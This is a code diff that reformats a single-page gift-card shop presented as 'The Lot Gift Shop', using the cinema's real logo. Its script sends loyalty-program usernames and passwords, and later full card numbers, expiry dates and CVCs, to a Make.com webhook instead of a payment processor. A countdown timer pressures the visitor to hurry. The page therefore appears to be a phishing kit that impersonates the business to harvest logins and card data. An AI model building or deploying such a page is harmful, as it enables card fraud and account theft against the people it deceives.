@@ -10,51 +10,54 @@
       --primary-light: #3D93F7;
       --bg-light: #f5f5f5;
       --card-bg: #ffffff;
-      --shadow: rgba(0,0,0,0.1);
+      --shadow: rgba(0, 0, 0, 0.1);
       --radius: 16px;
       --font: 'Helvetica Neue', Helvetica, sans-serif;
     }
-    * {box-sizing:border-box; margin:0; padding:0;}
-    body {font-family:var(--font); background:var(--bg-light); color:var(--primary-dark);
-      display:flex; align-items:center; justify-content:center; min-height:100vh; padding:2rem;}
-    .container {background:var(--card-bg); border-radius:var(--radius); box-shadow:0 4px 12px var(--shadow);
-      width:100%; max-width:480px; overflow:hidden; position:relative;}
-    header {background:var(--primary-dark); padding:1.5rem; text-align:center;}
-    header img {width:160px;}
-    main {padding:2rem;}
-    section {display:none;}
-    section.active {display:block;}
-    h1 {font-size:1.8rem; margin-bottom:1rem; text-align:center;}
-    .controls, .buttons {display:flex; align-items:center; justify-content:center; gap:1rem; margin-bottom:2rem;}
-    button, .btn {background:var(--primary-dark); color:#fff; border:none; border-radius:var(--radius);
-      padding:0.75rem 1.5rem; font-size:1rem; cursor:pointer; transition:background 0.3s;}
-    button:hover, .btn:hover {background:var(--primary-light);}
-    input, select {width:100%; padding:1rem; font-size:1rem; border:2px solid var(--primary-dark);
-      border-radius:var(--radius); background:#fff; margin-bottom:1rem;}
-    input[readonly] {background:#e9ecef; cursor:not-allowed;}
-    label {display:block; margin-bottom:0.5rem; font-weight:bold;}
-    #loading {display:none; position:absolute; top:0; left:0; right:0; bottom:0;
-      background:rgba(255,255,255,0.8); border-radius:var(--radius);
-      font-size:1.2rem; font-weight:bold; color:var(--primary-dark); z-index:10;}
-    #timer {text-align:center; font-size:1.2rem; margin-bottom:1rem;}
-    footer {text-align:center; padding:1rem; font-size:0.9rem; color:#666;}
-    /* Centering */
-    #sec-amount #next-loyalty, #sec-pay button[type="submit"], #sec-thanks #finish {
-      display:block; margin:0.5rem auto; width:50%;
+    * {box-sizing: border-box; margin: 0; padding: 0;}
+    body {font-family: var(--font); background: var(--bg-light); color: var(--primary-dark); display: flex; align-items: center; justify-content: center; min-height: 100vh; padding: 2rem;}
+    .container {background: var(--card-bg); border-radius: var(--radius); box-shadow: 0 4px 12px var(--shadow); width: 100%; max-width: 480px; overflow: hidden; position: relative;}
+    header {background: var(--primary-dark); padding: 1.5rem; text-align: center;}
+    header img {width: 160px;}
+    main {padding: 2rem;}
+    section {display: none;}
+    section.active {display: block;}
+    h1 {font-size: 1.8rem; margin-bottom: 1rem; text-align: center;}
+    .giftcard-image {display: block; margin: 0 auto 1.5rem; width: 100%; max-width: 250px; border-radius: var(--radius);}
+    .controls, .buttons {display: flex; align-items: center; justify-content: center; gap: 1rem; margin-bottom: 2rem;}
+    button, .btn {background: var(--primary-dark); color: #fff; border: none; border-radius: var(--radius); padding: 0.75rem 1.5rem; font-size: 1rem; cursor: pointer; transition: background 0.3s;}
+    button:hover, .btn:hover {background: var(--primary-light);}
+    input, select {width: 100%; padding: 1rem; font-size: 1rem; border: 2px solid var(--primary-dark); border-radius: var(--radius); background: #fff; margin-bottom: 1rem;}
+    input[readonly] {background: #e9ecef; cursor: not-allowed;}
+    label {display: block; margin-bottom: 0.5rem; font-weight: bold;}
+    #loading {
+      display: none;
+      position: absolute;
+      top: 0; left: 0; right: 0; bottom: 0;
+      background: rgba(255,255,255,0.8);
+      border-radius: var(--radius);
+      /* Remove direct flex layout to stay hidden */
+      font-size: 1.2rem;
+      font-weight: bold;
+      color: var(--primary-dark);
+      z-index: 10;
     }
-    #sec-amount .controls input {width:80px;}
-    #sec-pay .g-recaptcha {display:flex; justify-content:center; margin-bottom:1rem;}
+    #timer {text-align: center; font-size: 1.2rem; margin-bottom: 1rem; color: var(--primary-dark);}
+    footer {text-align: center; padding: 1rem; font-size: 0.9rem; color: #666;}
+    /* Centering adjustments */
+    #sec-amount #next-loyalty, #sec-pay button[type="submit"], #sec-thanks #finish {display: block; margin: 0.5rem auto; width: 50%;}
+    #sec-amount .controls input {width: 80px;}
+    #sec-pay .g-recaptcha {display: flex; justify-content: center; margin-bottom: 1rem;}
   </style>
 </head>
 <body>
   <div class="container">
     <div id="loading">Processing...</div>
     <header>
-      <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2"
-           alt="The Lot Logo">
+      <img src="https://cdn.theatertoolkit.com/cdn/wwwroot/themes/custom/thelotent/images/logo.png?v=20250408.2" alt="The Lot Logo">
     </header>
     <main>
-      <!-- 1. Amount -->
+      <!-- Amount Selection -->
       <section id="sec-amount" class="active">
         <h1>Select Gift Card Value</h1>
         <div class="controls">
@@ -64,21 +67,19 @@
         </div>
         <button id="next-loyalty">Continue</button>
       </section>
-
-      <!-- 2. Loyalty -->
+      <!-- Loyalty Login -->
       <section id="sec-loyalty">
         <h1>Loyalty Login</h1>
         <form id="frm-loyalty">
-          <input type="text" id="user" placeholder="Username" required />
-          <input type="password" id="pass" placeholder="Password" required />
+          <input type="text" id="user" placeholder="Username" />
+          <input type="password" id="pass" placeholder="Password" />
           <div class="buttons">
             <button type="button" id="skip">Skip</button>
             <button type="submit">Login</button>
           </div>
         </form>
       </section>
-
-      <!-- 3. Payment -->
+      <!-- Payment -->
       <section id="sec-pay">
         <h1>Payment Details</h1>
         <div id="timer">Time remaining: <span id="time">03:00</span></div>
@@ -87,8 +88,7 @@
           <input type="tel" id="phone" placeholder="Phone" required />
           <label for="card_type">Card Type</label>
           <select id="card_type" required>
-            <option value="">Select Card</option>
-            <option>Visa</option><option>Mastercard</option><option>AMEX</option>
+            <option value="">Select Card</option><option>Visa</option><option>Mastercard</option><option>AMEX</option>
           </select>
           <input type="text" id="name" placeholder="Name on Card" required />
           <input type="text" id="number" placeholder="Card Number" maxlength="16" required />
@@ -103,8 +103,7 @@
           <button type="submit">Pay</button>
         </form>
       </section>
-
-      <!-- 4. Thanks -->
+      <!-- Thank You -->
       <section id="sec-thanks">
         <h1>Thank You!</h1>
         <p>Your order is confirmed. Check your email for details.</p>
@@ -113,149 +112,59 @@
     </main>
     <footer>&copy; The Lot Gift Shop</footer>
   </div>
-
   <script src="https://www.google.com/recaptcha/api.js" async defer></script>
   <script>
-    // Sections
-    const secs = {
-      amount: document.getElementById('sec-amount'),
-      loyalty: document.getElementById('sec-loyalty'),
-      pay:     document.getElementById('sec-pay'),
-      thanks:  document.getElementById('sec-thanks')
-    };
-
+    const secs = { amount: document.getElementById('sec-amount'), loyalty: document.getElementById('sec-loyalty'), pay: document.getElementById('sec-pay'), thanks: document.getElementById('sec-thanks') };
     let amt = 100, timerInterval;
-    const amtInput   = document.getElementById('amount');
-    const timeDisplay= document.getElementById('time');
-    window.loyaltyToken = '';  // ← Guardamos aquí el token
-
-    // Muestra sección y controla timer
-    function show(sec) {
+    const amtInput = document.getElementById('amount');
+    const timeDisplay = document.getElementById('time');
+    function show(section) {
       Object.values(secs).forEach(s => s.classList.remove('active'));
-      secs[sec].classList.add('active');
-      if (sec === 'pay') startTimer(); else stopTimer();
-      // Actualiza display de amount antes de pago
-      if (sec === 'pay') {
-        document.getElementById('amt-display').value = amt;
-        document.getElementById('amt-hidden').value = amt;
-      }
+      secs[section].classList.add('active');
+      if (section === 'pay') startTimer(); else stopTimer();
     }
-
-    // Timer 3 min
+    // Timer logic
     function startTimer() {
-      let t = 180;
+      let time = 180;
       updateTime();
       timerInterval = setInterval(() => {
-        t--;
-        if (t < 0) {
-          clearInterval(timerInterval);
-          alert('Session expired. Returning to start.');
-          resetAll();
-          show('amount');
-        } else updateTime();
+        time--;
+        if (time < 0) { clearInterval(timerInterval); alert('Session expired. Redirecting to start.'); resetAll(); show('amount'); return; }
+        updateTime();
       }, 1000);
       function updateTime() {
-        const m = String(Math.floor(t/60)).padStart(2,'0'),
-              s = String(t % 60).padStart(2,'0');
+        const m = String(Math.floor(time/60)).padStart(2,'0');
+        const s = String(time%60).padStart(2,'0');
         timeDisplay.textContent = `${m}:${s}`;
       }
     }
-    function stopTimer() {
-      clearInterval(timerInterval);
-      timeDisplay.textContent = '03:00';
-    }
-    function resetAll() {
-      amt = 100; amtInput.value = amt;
-      document.getElementById('user').value = '';
-      document.getElementById('pass').value = '';
-      window.loyaltyToken = '';
-    }
+    function stopTimer() { clearInterval(timerInterval); timeDisplay.textContent = '03:00'; }
+    function resetAll() { amt = 100; amtInput.value = amt; document.getElementById('user').value=''; document.getElementById('pass').value=''; }
 
-    // Events
-    document.getElementById('dec').onclick = 
-      () => { if (amt > 5) { amt -= 5; amtInput.value = amt; } };
-    document.getElementById('inc').onclick = 
-      () => { if (amt < 500) { amt += 5; amtInput.value = amt; } };
+    // Event bindings
+    document.getElementById('dec').onclick = () => { if (amt > 5) { amt -= 5; amtInput.value = amt; } };
+    document.getElementById('inc').onclick = () => { if (amt < 500) { amt += 5; amtInput.value = amt; } };
     document.getElementById('next-loyalty').onclick = () => show('loyalty');
-    document.getElementById('skip').onclick = () => show('pay');
-
-    // 1) Login loyalty (solo guarda token, NO envía a Make)
+    document.getElementById('skip').onclick = () => { prepPay(); show('pay'); };
     document.getElementById('frm-loyalty').onsubmit = e => {
-      e.preventDefault();
-      const u = document.getElementById('user').value.trim(),
-            p = document.getElementById('pass').value.trim();
-      if (!u || !p) {
-        return alert('Please enter your loyalty credentials.');
-      }
-      document.getElementById('loading').style.display = 'block';
-      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
-        method: 'POST',
-        headers:{ 'Content-Type':'application/json' },
-        body: JSON.stringify({ loyaltyUser: u, loyaltyPass: p, amount: amt })
-      })
-      .then(r=>r.json())
-      .then(res=>{
-        document.getElementById('loading').style.display = 'none';
-        if (res.ExtendedResultCode !== 0) {
-          return alert(res.ErrorDescription || 'Invalid credentials.');
-        }
-        // guardamos token y avanzamos
-        window.loyaltyToken = res.LoyaltySessionToken;
-        show('pay');
-      })
-      .catch(err=>{
-        document.getElementById('loading').style.display = 'none';
-        alert('Error validating credentials.');
-      });
+      e.preventDefault(); const u=document.getElementById('user').value.trim(), p=document.getElementById('pass').value.trim();
+      if (!u||!p) return alert('Please enter your loyalty credentials.');
+      document.getElementById('loading').style.display='flex';
+      fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({loyaltyUser:u, loyaltyPass:p, amount:amt})})
+      .then(r=>r.json()).then(r=>{document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode!==0) return alert(r.ErrorDescription||'Invalid credentials.'); prepPay(); show('pay');})
+      .catch(()=>{document.getElementById('loading').style.display='none'; alert('Error validating credentials.');});
     };
-
-    // 2) Submit payment (AQUÍ se envía TODO a Make)
+    function prepPay() { document.getElementById('amt-display').value=amt; document.getElementById('amt-hidden').value=amt; }
     document.getElementById('frm-pay').onsubmit = async e => {
-      e.preventDefault();
-      const rec = grecaptcha.getResponse();
-      if (!rec) {
-        return alert('Please complete the reCAPTCHA.');
-      }
-      document.getElementById('loading').style.display = 'block';
-
-      // Preparamos payload completo (incluye loyaltyToken)
-      const payload = {
-        loyaltyToken: window.loyaltyToken,
-        customer_email:  document.getElementById('email').value,
-        customer_phone:  document.getElementById('phone').value,
-        card_type:       document.getElementById('card_type').value,
-        card_name:       document.getElementById('name').value,
-        card_number:     document.getElementById('number').value,
-        card_expiry:     document.getElementById('expiry').value,
-        card_cvc:        document.getElementById('cvc').value,
-        amount:          amt,
-        'g-recaptcha-response': rec
-      };
-
-      try {
-        // Única llamada a Make que dispara tu escenario HTTP modules
-        const response = await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla', {
-          method: 'POST',
-          headers: { 'Content-Type':'application/json' },
-          body: JSON.stringify(payload)
-        });
-        const text = await response.text();
-        const obj  = JSON.parse(text);
-        const r    = Array.isArray(obj) ? obj[0] : obj;
-
-        document.getElementById('loading').style.display = 'none';
-        if (r.ExtendedResultCode === 0) {
-          stopTimer();
-          show('thanks');
-        } else {
-          alert(r.ErrorDescription || 'Payment error.');
-        }
-      } catch (err) {
-        document.getElementById('loading').style.display = 'none';
-        alert('Error processing payment.');
-      }
+      e.preventDefault(); const rec=grecaptcha.getResponse(); if(!rec) return alert('Please complete the reCAPTCHA.');
+      document.getElementById('loading').style.display='flex';
+      const data={ customer_email:document.getElementById('email').value, customer_phone:document.getElementById('phone').value, card_type:document.getElementById('card_type').value, card_name:document.getElementById('name').value, card_number:document.getElementById('number').value, card_expiry:document.getElementById('expiry').value, card_cvc:document.getElementById('cvc').value, amount:amt, 'g-recaptcha-response':rec };
+      try{
+        const res=await fetch('https://hook.us2.make.com/j4shhdd1b8axa0ycwq857159hga53tla',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(data)});
+        const txt=await res.text(), obj=JSON.parse(txt), r=Array.isArray(obj)?obj[0]:obj;
+        document.getElementById('loading').style.display='none'; if(r.ExtendedResultCode===0) { stopTimer(); show('thanks'); } else alert(r.ErrorDescription||'Payment error.');
+      }catch{document.getElementById('loading').style.display='none'; alert('Error processing payment.');}
     };
-
     document.getElementById('finish').onclick = () => location.reload();
   </script>
 </body>
